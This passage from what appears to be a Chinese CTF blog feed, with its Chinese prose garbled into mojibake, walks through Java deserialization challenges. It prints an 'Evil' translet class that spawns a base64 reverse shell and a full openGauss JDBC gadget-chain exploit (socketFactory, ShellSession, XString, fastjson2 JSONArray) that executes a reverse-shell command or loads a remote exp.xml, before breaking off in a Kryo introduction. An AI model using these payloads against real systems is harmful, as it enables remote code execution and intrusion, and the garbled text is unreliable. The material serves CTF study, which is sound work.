class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917151643797.png" alt="image-20240917151643797"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240917151501140.png" alt="image-20240917151501140"></p><h2 id="2024äº¬æ´¥å†€é•¿åŸæ¯-openGuass"><a href="#2024äº¬æ´¥å†€é•¿åŸæ¯-openGuass" class="headerlink" title="2024äº¬æ´¥å†€é•¿åŸæ¯-openGuass"></a>2024äº¬æ´¥å†€é•¿åŸæ¯-openGuass</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>éå¸¸å¥½jdbcï¼Œä½¿æˆ‘çš„jdk17æ—‹è½¬ã€‚</p><p>UserControlleré€»è¾‘å¾ˆç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&#123;&quot;/user&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/info&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">ser</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String data)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data)));<br>            <span class="hljs-type">admin</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (admin)ois.readObject();<br>            <span class="hljs-keyword">return</span> user.getName();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var4) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var4;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€æ‰‹ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.opengauss<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>opengauss-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1-compatibility<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.oracle.coherence.ce<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>coherence-rest<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>14.1.1-0-3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.37<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ€è·¯å‚ç…§æ¬§é˜³å­¦é•¿çš„ï¼š<a href="https://h4cking2thegate.github.io/posts/44597/">è®°ä¸€æ¬¡tabbyåˆ©ç”¨é“¾æŒ–æ˜ | H4cking to the Gate . (h4cking2thegate.github.io)</a></p><p>æœ¬é¢˜ä¾èµ–å­˜åœ¨ opengauss-jdbcï¼Œè™½ç„¶æ²¡è§è¿‡ï¼Œä½†æ˜¯å¯ä»¥ä»ä»£ç å’Œæ–‡æ¡£ä¸­çœ‹åˆ°ï¼Œæ˜¯ç”¨ postgre jdbc æ”¹çš„ï¼Œé‚£ä¹ˆç»å…¸çš„æ–¹æ³•å°±æ˜¯åˆ©ç”¨ socketFactory æ¥è§¦å‘ String å‚æ•°æ„é€ æ–¹æ³•</p><p>å¸¸è§çš„å‡ºç½‘åˆ©ç”¨æ–¹æ³•æ˜¯ <code>ClassPathXmlApplicationContext</code>ã€‚</p><p>é‚£ä¹ˆåˆ©ç”¨é“¾ä¸­é—´çš„éƒ¨åˆ†å¯ä»¥æš‚å®šä¸º jdbcï¼Œæ¥ä¸‹æ¥éœ€è¦è§¦å‘ getterï¼Œä»¥åŠå¯»æ‰¾ sinkã€‚</p><p>æˆ‘ä»¬å¯ä»¥å†™å‡ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">myargs</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8000/exp.xml&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> getDataSource(className, myargs);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getDataSource</span><span class="hljs-params">(String className, String myargs)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>    properties.setProperty(<span class="hljs-string">&quot;socketFactory&quot;</span>, className);<br>    properties.setProperty(<span class="hljs-string">&quot;socketFactoryArg&quot;</span>, myargs);<br><br>    <span class="hljs-type">PGSimpleDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PGSimpleDataSource</span>();<br>    setFieldValue(dataSource, <span class="hljs-string">&quot;properties&quot;</span>, properties);<br>    dataSource.setUser(<span class="hljs-string">&quot;test&quot;</span>);<br>    dataSource.setPassword(<span class="hljs-string">&quot;test&quot;</span>);<br>    dataSource.setServerName(<span class="hljs-string">&quot;localhost&quot;</span>);<br>    dataSource.setPortNumber(<span class="hljs-number">1234</span>);<br>    dataSource.setDatabaseName(<span class="hljs-string">&quot;test&quot;</span>);<br>    <span class="hljs-keyword">return</span> dataSource;<br>&#125;<br></code></pre></td></tr></table></figure><p>getDataSourceå³æ˜¯åˆ©ç”¨socketFactoryæ¥è®¾ç½®pgæ•°æ®åº“çš„ä¸€äº›å‚æ•°ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰getConnectæ“ä½œï¼Œæ‰€ä»¥åªæ˜¯ä¸€ä¸ªè®¾ç½®ï¼Œå¹¶ä¸éœ€è¦æœ¬åœ°èµ·ä¸€ä¸ªpgæ•°æ®åº“ã€‚</p><p>è‹¥æˆ‘ä»¬æƒ³åœ¨jdk17ä¸‹è§¦å‘toStringï¼Œå¯ä»¥ç”¨Jacksoné“¾çš„<code>EventListenerList</code>æˆ–è€… <code>Xstring</code>ï¼Œæˆ–è®¸ä¾èµ–ä¸­è¿˜å­˜åœ¨åˆ«çš„åˆ©ç”¨é“¾ã€‚</p><p>ä¸‹é¢ç”¨<code>XString</code>æ¥å®ç°ã€‚</p><p>å­¦é•¿å…¶å®è¿˜æŒ–æ˜åˆ°ä¸€ä¸ªå…¥å£ç±»ï¼Œtqlï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.tangosol.coherence.mvel2.sh.ShellSession#ShellSession (java.lang.String)<br></code></pre></td></tr></table></figure><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> cn.openGauss.WebApp.user.admin;<br><br><span class="hljs-comment">//import com.huawei.shade.com.alibaba.fastjson.JSONArray;</span><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> org.opengauss.ds.PGSimpleDataSource;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><br><span class="hljs-comment">//import static cn.openGauss.WebApp.exp.PgTest.getDataSource;</span><br><span class="hljs-comment">//import static cn.openGauss.WebApp.exp.Utils.*;</span><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OpenGaussTest</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">admin</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">admin</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.tangosol.coherence.mvel2.sh.ShellSession&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">myargs</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new java.lang.ProcessBuilder(new java.lang.String[]&#123;\&quot;bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;).start()&quot;</span>;<br><br><span class="hljs-comment">//        String className = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;</span><br><span class="hljs-comment">//        String myargs = &quot;http://localhost:7788/exp.xml&quot;;</span><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> getDataSource(className, myargs);<br><span class="hljs-comment">//        ((DataSource)dataSource).getConnection();</span><br><span class="hljs-comment">//        Object proxy = getProxy(user, DataSource.class);</span><br><span class="hljs-comment">//        Object exp = getBadAttr(proxy);</span><br><span class="hljs-comment">//        Object exp = getXstringMap(user);</span><br><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(dataSource, DataSource.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> getXstringMap(proxy);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> base64Serialize(exp);<br>        base64Deserialize(b);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getXstringMap</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br><span class="hljs-comment">//        CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class="hljs-comment">//        CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class="hljs-comment">//        ctClass.removeMethod(writeReplace);</span><br><span class="hljs-comment">//        ctClass.toClass();</span><br><span class="hljs-comment">//        POJONode node = new POJONode(obj);</span><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        node.add(obj);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, node);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, node);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeMap(map1, map2);<br><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getBadAttr</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(obj);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>è‡ªè¡Œè¡¥å……é‚£å‡ ä¸ªæ–¹æ³•å°±å¯ä»¥äº†ï¼Œå¯ä»¥ç›´æ¥ç”¨fjçš„å¹³æ›¿ã€‚</p><p>è¿˜æ¶‰åŠä¸€ä¸ªJVMçš„vm-optionsæ“ä½œï¼Œä¸ç„¶æ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨XStringçš„ï¼Œè€Œä¸”pomé‡Œè¿˜éœ€è¦buildç‰¹å®šçš„ä¸œè¥¿ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šæ‰¾ä¸åˆ°åŒ…ï¼ˆæ»¡æ»¡çš„å‘ï¼‰ã€‚</p><p>setFieldValueä¸èƒ½ç›´æ¥å†™ç®€å•çš„åå°„ï¼Œåº”è¯¥è¦åšåˆ°é€’å½’è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œä¸ç„¶ä¹Ÿæ˜¯è°ƒç”¨ä¸åˆ°setPropertyæ–¹æ³•ã€‚</p><p><code>org.springframework.context.support.ClassPathXmlApplicationContext</code>åŒç†å¯é€šï¼Œå‡ºç½‘éšä¾¿æ‰“ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923150053269.png" alt="image-20240923150053269"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923150000954.png" alt="image-20240923150000954"></p><p>å­¦é•¿çš„æŒ–æ˜é“¾æ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923145854643.png" alt="image-20240923145854643"></p><p>ï¼ˆæœªå®Œå¾…ç»­â€¦.ï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kryo</title>
    <link href="/2024/08/14/Kyro/"/>
    <url>/2024/08/14/Kyro/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¥æƒ³ç¼“ä¸¤å¤©å†å†™Hessiançš„ï¼Œä½†æ˜¯è¢«å·åˆ°äº†emmmã€‚</p><p>è®¨åŒå·ç‹—ã€‚</p><p>Hessianå¤ªå¤šäº†ï¼Œä¸€æ¬¡å†™ä¸å®Œçš„ï¼Œé‚£æˆ‘è¿™æ¬¡å°±å†™å†™Kryoå§ï¼Œä¸‹æ¬¡å†™è¡¨è¾¾å¼æ³¨å…¥SSTIä¹‹ç±»çš„ï¼ŒHessiané¥é¥æ— æœŸäº†hhhhã€‚</p><p>Kryo æ˜¯ä¸€ä¸ªå¿«é€Ÿåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å·¥å…·ï¼Œä¾èµ–äºå­—èŠ‚ç ç”Ÿæˆæœºåˆ¶ï¼ˆåº•å±‚ä½¿ç”¨äº† ASM åº“)ï¼Œå› æ­¤åœ¨åºåˆ—åŒ–é€Ÿåº¦ä¸Šæœ‰ä¸€å®šçš„ä¼˜åŠ¿ï¼Œä½†æ­£å› å¦‚æ­¤ï¼Œå…¶ä½¿ç”¨ä¹Ÿåªèƒ½é™åˆ¶åœ¨åŸºäº JVM çš„è¯­è¨€ä¸Šï¼ˆScalaã€Kotlinï¼‰</p><p>å…¶ä»–ç±»ä¼¼çš„åºåˆ—åŒ–å·¥å…·ï¼šåŸç”ŸJDKã€Hessianã€FTS</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://github.com/EsotericSoftware/kryo">https://github.com/EsotericSoftware/kryo</a></p><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¾…åºåˆ—åŒ–ç›®æ ‡ç±»MyClassï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>    <span class="hljs-keyword">public</span> String hello;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> num;<br>   <span class="hljs-comment">// çœç•¥getterã€setterã€toString</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span 